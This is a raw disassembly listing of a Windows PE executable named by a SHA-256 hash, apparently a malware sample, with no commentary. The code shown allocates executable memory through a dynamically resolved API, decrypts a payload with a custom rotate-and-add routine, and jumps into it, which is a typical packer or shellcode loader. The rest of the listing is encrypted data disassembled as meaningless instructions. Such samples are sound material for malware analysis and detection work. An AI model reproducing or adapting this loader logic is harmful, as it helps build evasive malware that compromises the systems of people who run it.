
66ab2c575c2a2ac32b7f8889031240df039bf08ed1d34e046c389a20af34c777.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0xc15e4463
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	loope  0x4114f6
  4114ad:	cmp    eax,0xc1bc4cdd
  4114b2:	jbe    0x411484
  4114b4:	hlt    
  4114b5:	aaa    
  4114b6:	inc    ebx
  4114b7:	daa    
  4114b8:	xor    WORD PTR [esi+eiz*1],0xc61d
  4114be:	cmp    ebp,ebp
  4114c0:	cli    
  4114c1:	(bad)  
  4114c2:	xlat   BYTE PTR ds:[ebx]
  4114c3:	dec    eax
  4114c4:	mov    ds:0xa9eec7fd,al
  4114c9:	in     eax,0x7
  4114cb:	and    al,0x2d
  4114cd:	sbb    BYTE PTR [ebx+0x53],0xd9
  4114d1:	pop    ebp
  4114d2:	and    dh,BYTE PTR [esi+0x50e10ac7]
  4114d8:	inc    ebx
  4114d9:	sub    bh,ch
  4114db:	sub    edi,DWORD PTR [edx+0x2b]
  4114de:	pop    es
  4114df:	(bad)  
  4114e0:	jmp    0x41146e
  4114e2:	inc    ebp
  4114e3:	jecxz  0x41148b
  4114e5:	call   0x82b5:0x4cca5c98
  4114ec:	fisubr WORD PTR [ebx]
  4114ee:	fnstsw WORD PTR [ebp+0x12]
  4114f1:	inc    ecx
  4114f2:	add    eax,0x5ac8029a
  4114f7:	pop    eax
  4114f8:	js     0x411544
  4114fa:	inc    ebx
  4114fb:	mov    ds,WORD PTR [ebx+0x2a944fec]
  411501:	dec    eax
  411502:	pop    es
  411503:	(bad)  
  411504:	mov    ch,0xae
  411506:	std    
  411507:	adc    DWORD PTR [ebp-0x3a],0xffffffa3
  41150b:	cmp    DWORD PTR [ebp+0x5025023a],ecx
  411511:	or     edi,eax
  411513:	jno    0x411533
  411515:	gs xchg ecx,eax
  411517:	cs js  0x411511
  41151a:	ins    DWORD PTR es:[edi],dx
  41151b:	sbb    ah,BYTE PTR [eax]
  41151d:	shl    DWORD PTR [esi-0x67dbb46d],1
  411523:	xor    ebp,DWORD PTR [edi+ebp*8+0xa]
  411527:	jno    0x4114e7
  411529:	rcr    DWORD PTR [ebx],1
  41152b:	push   edx
  41152c:	fsubr  DWORD PTR [esi-0x11]
  41152f:	mov    DWORD PTR [edx-0x1d],esi
  411532:	and    al,0x37
  411534:	adc    eax,0x6086049a
  411539:	pop    ss
  41153a:	mov    edx,0xf0882dbe
  41153f:	mov    ah,0x29
  411541:	jge    0x411503
  411543:	bound  esp,QWORD PTR [esi]
  411545:	mov    WORD PTR [edi+0x6c2b8719],?
  41154b:	retf   0x1074
  41154e:	jmp    0x41156a
  411550:	in     eax,0x2d
  411552:	pop    edx
  411553:	inc    esi
  411554:	je     0x4115be
  411556:	xchg   esi,eax
  411557:	aaa    
  411558:	nop
  411559:	push   ecx
  41155a:	je     0x41151f
  41155c:	cmc    
  41155d:	adc    al,0xa
  41155f:	add    cl,al
  411561:	(bad)  
  411562:	mov    edi,es
  411564:	mov    cl,0x30
  411566:	int    0x4f
  411568:	xor    al,0x3e
  41156a:	pop    eax
  41156b:	and    esi,DWORD PTR [esi]
  41156d:	and    eax,0x5c0500ba
  411572:	mov    ebx,0x53dc2268
  411577:	clc    
  411578:	mov    dl,0x87
  41157a:	hlt    
  41157b:	nop
  41157c:	ds in  eax,dx
  41157e:	adc    BYTE PTR [edi+0x3],dh
  411581:	pushf  
  411582:	push   ds
  411583:	mov    al,ds:0xbdd000e2
  411588:	sub    al,0xcd
  41158a:	std    
  41158b:	cmp    eax,0xc684fd0b
  411590:	or     BYTE PTR [ebx+0x229d33f9],0x4a
  411597:	pusha  
  411598:	pop    edi
  411599:	aad    0xb
  41159b:	inc    edi
  41159c:	stc    
  41159d:	mov    ds,WORD PTR [ecx]
  41159f:	cs daa 
  4115a1:	mov    dh,0xd
  4115a3:	nop
  4115a4:	sbb    eax,0x99133c3d
  4115a9:	jmp    0xcd5a:0x5bf74206
  4115b0:	icebp  
  4115b1:	mov    bl,0x7b
  4115b3:	in     al,0xd1
  4115b5:	arpl   WORD PTR [ecx-0x4b],si
  4115b8:	cmp    bl,BYTE PTR [esi-0x6d]
  4115bb:	mov    edi,0xc3fd45
  4115c0:	xor    ecx,DWORD PTR [edi+0x2e8b26bb]
  4115c6:	mov    cl,0xd2
  4115c8:	mov    bh,0x81
  4115ca:	or     eax,0xad0997d2
  4115cf:	xlat   BYTE PTR ds:[ebx]
  4115d0:	fs cmp al,0xd3
  4115d3:	mov    bh,0xeb
  4115d5:	pop    es
  4115d6:	fwait
  4115d7:	cld    
  4115d8:	(bad)  
  4115d9:	sbb    al,0x1c
  4115db:	xor    DWORD PTR [ecx+ebx*4-0x2b15730f],ebp
  4115e2:	stc    
  4115e3:	or     DWORD PTR [edx-0x4d],edx
  4115e6:	jle    0x411646
  4115e8:	sub    al,0x4
  4115ea:	out    dx,eax
  4115eb:	push   cs
  4115ec:	cs xchg dh,dh
  4115ef:	sub    eax,0x8078ae7f
  4115f4:	iret   
  4115f5:	push   esi
  4115f6:	ins    DWORD PTR es:[edi],dx
  4115f7:	dec    ebx
  4115f8:	out    dx,al
  4115f9:	(bad)  
  4115fa:	pop    edx
  4115fb:	jne    0x411581
  4115fd:	jno    0x41163b
  4115ff:	pop    edi
  411600:	sub    eax,0x1b4ad9ce
  411605:	test   BYTE PTR ds:0x7ca77a34,bl
  41160b:	ret    0x6049
  41160e:	xchg   ecx,eax
  41160f:	ffree  st(5)
  411611:	mov    edx,0xfe350fd9
  411616:	and    al,dh
  411618:	retf   
  411619:	ret    
  41161a:	push   edx
  41161b:	retf   0xbba3
  41161e:	push   esi
  41161f:	mov    esi,0x594bdd27
  411624:	xchg   edx,eax
  411625:	(bad)  
  411626:	rcr    DWORD PTR [edi-0x47],cl
  411629:	add    ecx,DWORD PTR [edi+0x1d]
  41162c:	loope  0x41161f
  41162e:	lock inc ebp
  411630:	mov    ah,0xf1
  411632:	test   DWORD PTR [ebp-0x57],eax
  411635:	adc    BYTE PTR [esi+ecx*4-0x324773bb],bl
  41163c:	mov    esi,0x73e3ba59
  411641:	les    ecx,FWORD PTR [eax-0x8fdaf1]
  411647:	xchg   cl,ch
  411649:	fistp  DWORD PTR [ebp-0x5e]
  41164c:	mov    bl,0x11
  41164e:	clc    
  41164f:	sub    ebp,esp
  411651:	out    0x6a,eax
  411653:	nop
  411654:	stos   BYTE PTR es:[edi],al
  411655:	push   esp
  411656:	out    0x8c,al
  411658:	das    
  411659:	cwde   
  41165a:	push   esp
  41165b:	inc    edx
  41165c:	sub    ch,BYTE PTR [eax+0x618bff8]
  411662:	bts    DWORD PTR [ebp+0x49],eax
  411666:	xor    ch,bl
  411668:	jno    0x411654
  41166a:	and    DWORD PTR [eax+0x6f],0xffffffcd
  41166e:	addr16 jae 0x41165d
  411671:	adc    al,0x2c
  411673:	xor    al,0x7d
  411675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411676:	push   ecx
  411677:	in     eax,dx
  411678:	inc    eax
  411679:	sub    ch,0x52
  41167c:	add    esp,DWORD PTR [esi-0xd]
  41167f:	xor    dl,al
  411681:	and    al,0xd5
  411683:	scas   al,BYTE PTR es:[edi]
  411684:	sbb    bl,bl
  411686:	xchg   ebp,eax
  411687:	and    edi,edi
  411689:	and    BYTE PTR [edx],al
  41168b:	inc    ebx
  41168c:	je     0x411691
  41168e:	sbb    BYTE PTR ds:0x7cd8e91a,ah
  411694:	inc    esp
  411695:	jbe    0x4116f9
  411697:	mov    eax,0xe7fff025
  41169c:	sti    
  41169d:	mov    ebp,0xebd4e2f1
  4116a2:	cmc    
  4116a3:	jmp    0xea768b9d
  4116a8:	repnz cmpxchg ch,dl
  4116ac:	jl     0x4116ed
  4116ae:	arpl   WORD PTR [ecx],sp
  4116b0:	xchg   ebx,eax
  4116b1:	inc    esi
  4116b2:	ds ins BYTE PTR es:[edi],dx
  4116b4:	pop    eax
  4116b5:	jge    0x411646
  4116b7:	mov    ecx,0xa885fb8
  4116bc:	jmp    0xbe94:0x5ec4ab63
  4116c3:	repnz mov edi,0x15c7c0eb
  4116c9:	cdq    
  4116ca:	(bad)  
  4116cb:	call   0xfb788857
  4116d0:	cmc    
  4116d1:	out    dx,eax
  4116d2:	dec    ebp
  4116d3:	and    eax,DWORD PTR [ebx]
  4116d5:	and    eax,0x6fab5d6f
  4116da:	jmp    0xbb9bd70
  4116df:	imul   ecx,DWORD PTR [edi+0xa],0x60a9007d
  4116e6:	mov    ds:0x71eef1bf,al
  4116eb:	test   al,0xdb
  4116ed:	call   0x5aee27a8
  4116f2:	enter  0x6494,0xb0
  4116f6:	sbb    DWORD PTR [ecx+0x23472b63],edi
  4116fc:	dec    eax
  4116fd:	dec    ebp
  4116fe:	dec    edi
  4116ff:	inc    ebx
  411700:	jmp    0xcd1e:0xcbdafa93
  411707:	xor    ah,dh
  411709:	jne    0x411768
  41170b:	jmp    0x899401fa
  411710:	bound  ebx,QWORD PTR [edi]
  411712:	jnp    0x411726
  411714:	ret    
  411715:	xchg   DWORD PTR [ecx+0x37ce65f3],edi
  41171b:	push   ebp
  41171c:	lahf   
  41171d:	mov    al,ds:0xe37a7c8
  411722:	mov    cl,BYTE PTR [eax+0x5cdc97e9]
  411728:	out    dx,al
  411729:	adc    BYTE PTR [edx+0x7b],dh
  41172c:	cmp    eax,0xeaf81a6a
  411731:	dec    esp
  411732:	mov    ah,0xea
  411734:	pusha  
  411735:	mov    ch,BYTE PTR [ecx]
  411737:	gs add al,0xcd
  41173a:	in     eax,0xbf
  41173c:	or     ecx,DWORD PTR [eax]
  41173e:	shld   DWORD PTR [edi-0x57],esi,cl
  411742:	mov    ch,0x37
  411744:	mov    bl,0x11
  411746:	adc    eax,0x6a362d6b
  41174b:	dec    ebp
  41174c:	push   ds
  41174d:	mov    ebp,0x7bba85de
  411752:	lfs    ebx,FWORD PTR [esi+esi*8-0x37]
  411757:	ror    eax,1
  411759:	pop    ebp
  41175a:	data16 mov BYTE PTR [esi-0x4e],ah
  41175e:	pop    ss
  41175f:	mov    bl,0xde
  411761:	mov    cl,0xcf
  411763:	lock cli 
  411765:	push   ebp
  411766:	cmp    eax,0xbc8a5cd
  41176b:	fisubr DWORD PTR [edi+ecx*2+0x7a2d750d]
  411772:	push   ss
  411773:	test   eax,0x4f746e39
  411778:	lds    ecx,FWORD PTR [edi+0x6def728b]
  41177e:	int    0xd7
  411780:	pop    ebx
  411781:	bound  esp,QWORD PTR [edi]
  411783:	add    eax,0x4cc65be5
  411788:	or     bl,bh
  41178a:	es aam 0x74
  41178d:	je     0x41172f
  41178f:	pusha  
  411790:	and    BYTE PTR ds:0x6ed2159d,dh
  411796:	and    dh,BYTE PTR [edi+edx*8-0x75]
  41179a:	push   ds
  41179b:	inc    edx
  41179c:	push   ebx
  41179d:	pop    eax
  41179e:	cs mov bh,0xd6
  4117a1:	fs call 0x8c53:0x734e7be7
  4117a9:	or     BYTE PTR [edi+0x978d35d],ch
  4117af:	fwait
  4117b0:	xchg   ebp,eax
  4117b1:	push   ds
  4117b2:	into   
  4117b3:	outs   dx,BYTE PTR ds:[esi]
  4117b4:	push   ebp
  4117b5:	jecxz  0x4117d2
  4117b7:	adc    eax,0x5319a37
  4117bc:	add    esp,DWORD PTR [esi+0x36]
  4117bf:	push   ebx
  4117c0:	icebp  
  4117c1:	push   edx
  4117c2:	(bad)  
  4117c4:	icebp  
  4117c5:	pop    ss
  4117c6:	je     0x411762
  4117c8:	and    BYTE PTR [edi],cl
  4117ca:	leave  
  4117cb:	in     eax,0x25
  4117cd:	cli    
  4117ce:	cmp    edi,DWORD PTR [ecx-0x57082e6e]
  4117d4:	(bad)  
  4117d5:	fs inc esi
  4117d7:	js     0x4117dd
  4117d9:	js     0x411819
  4117db:	mov    eax,0x97b3dd7a
  4117e0:	into   
  4117e1:	xlat   BYTE PTR ds:[ebx]
  4117e2:	aam    0x73
  4117e4:	add    ebp,DWORD PTR [esi-0x56]
  4117e7:	dec    esp
  4117e8:	sub    DWORD PTR [edi-0x734ccc35],ebp
  4117ee:	xor    DWORD PTR [edx],ecx
  4117f0:	push   0xffffffba
  4117f2:	xchg   ebp,eax
  4117f3:	(bad)  [ebx]
  4117f5:	dec    esi
  4117f6:	pop    ebp
  4117f7:	fs jmp 0x41179f
  4117fa:	sub    esi,ebx
  4117fc:	push   esp
  4117fd:	mov    ch,0xfd
  4117ff:	ins    BYTE PTR es:[edi],dx
  411800:	(bad)  
  411802:	inc    ebp
  411803:	mov    eax,ds:0xdeeeff1b
  411808:	and    BYTE PTR [edi+0x6b5e45ed],ah
  41180e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41180f:	out    0xbb,al
  411811:	jo     0x4117d4
  411813:	xchg   ecx,eax
  411814:	mov    eax,ds:0x2acdab3e
  411819:	push   ebx
  41181a:	push   esi
  41181b:	push   edi
  41181c:	test   BYTE PTR [ebp-0x52],dl
  41181f:	test   al,0xcb
  411821:	push   0x21
  411823:	data16 cmp cl,al
  411826:	add    al,0xb1
  411828:	add    al,0x55
  41182a:	ds adc eax,0xf27d92ab
  411830:	nop
  411831:	dec    esi
  411832:	push   ebx
  411833:	(bad)  
  411834:	in     al,0x2c
  411836:	out    dx,al
  411837:	loop   0x411809
  411839:	mov    ecx,0xf64faa53
  41183e:	pop    ebp
  41183f:	or     DWORD PTR [ecx-0x5f],0xfa03dda8
  411846:	popf   
  411847:	mov    ds:0xb33cb4a4,al
  41184c:	mov    gs,WORD PTR [ebx]
  41184e:	js     0x4118a5
  411850:	inc    eax
  411851:	cmp    eax,DWORD PTR [esi+0x57]
  411854:	dec    esp
  411855:	xor    dh,ah
  411857:	dec    esi
  411858:	pop    edx
  411859:	mov    ah,0x4b
  41185b:	jb     0x411891
  41185d:	push   ss
  41185e:	sbb    bh,BYTE PTR [ebp+0x1e]
  411861:	mov    BYTE PTR [ecx],dl
  411863:	push   esp
  411864:	xchg   ah,al
  411866:	or     BYTE PTR [esi-0x7b],bh
  411869:	dec    ebx
  41186a:	xchg   BYTE PTR [ebp-0x2d],dh
  41186d:	xchg   ecx,eax
  41186e:	test   dh,0xcb
  411871:	jl     0x41186e
  411873:	xor    DWORD PTR [eax+esi*4-0xb86849],edi
  41187a:	or     DWORD PTR [esi-0x76],0x23
  41187e:	adc    eax,0x230e4d92
  411883:	and    eax,DWORD PTR [edx]
  411885:	mov    dl,BYTE PTR [edi]
  411887:	in     eax,0x6a
  411889:	out    0xd2,eax
  41188b:	lock cmp esi,DWORD PTR [edx-0x123bb309]
  411892:	xor    ecx,DWORD PTR [edx-0x2f]
  411895:	cmp    BYTE PTR [edi-0x26b6081b],bl
  41189b:	ret    
  41189c:	and    ebx,edx
  41189e:	test   al,0xb3
  4118a0:	lds    edi,FWORD PTR [esi]
  4118a2:	push   eax
  4118a3:	stc    
  4118a4:	or     al,0x5
  4118a6:	loop   0x4118c8
  4118a8:	xchg   ebp,eax
  4118a9:	pop    ss
  4118aa:	mov    al,ds:0xb95af5e7
  4118af:	out    dx,al
  4118b0:	lea    esi,[ebx]
  4118b2:	dec    esi
  4118b3:	adc    eax,0xa4b38abf
  4118b8:	aaa    
  4118b9:	icebp  
  4118ba:	jmp    FWORD PTR [eax+edx*8+0x70]
  4118be:	push   ds
  4118bf:	add    eax,0xfa900509
  4118c4:	jb     0x411925
  4118c6:	(bad)  
  4118c7:	aas    
  4118c8:	repz xchg ebx,eax
  4118ca:	ret    0x3ff9
  4118cd:	mov    bl,0x6a
  4118cf:	test   al,0x65
  4118d1:	cwde   
  4118d2:	push   ebp
  4118d3:	mov    ch,0x84
  4118d5:	out    0xc6,al
  4118d7:	sub    al,0x63
